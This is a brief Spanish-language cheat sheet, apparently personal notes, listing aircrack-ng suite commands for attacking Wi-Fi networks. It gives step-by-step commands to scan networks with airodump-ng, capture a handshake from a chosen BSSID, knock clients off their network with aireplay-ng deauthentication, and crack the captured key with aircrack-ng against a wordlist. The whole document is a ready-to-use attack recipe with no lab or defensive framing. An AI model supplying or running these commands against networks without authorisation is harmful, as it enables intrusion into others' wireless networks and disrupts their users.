#Metodo para escanear redes con la tarjeta de red
sudo airodump-ng wlan0 - escanear
#Metodo para capturar un hash
sudo airodump-ng -c {canal} -w {nombre archivo} --bssid {mac de red} {interface} - escaneo especifico
#Metodo para desautenticar a un cliente de su red
sudo aireplay-ng -0 {cantidad peticion} -a {macservidor} -c {macliente} {interface}
#Metodo apra saber si una clave esta en un diccionario
cat {diccionario} | grep {nombre_clave}
#Metodo de fuerza bruta con aircrack
sudo aircrack-ng -w /home/andres/diccionarios/librito.txt  -b {bssid_router} wifi.cap 
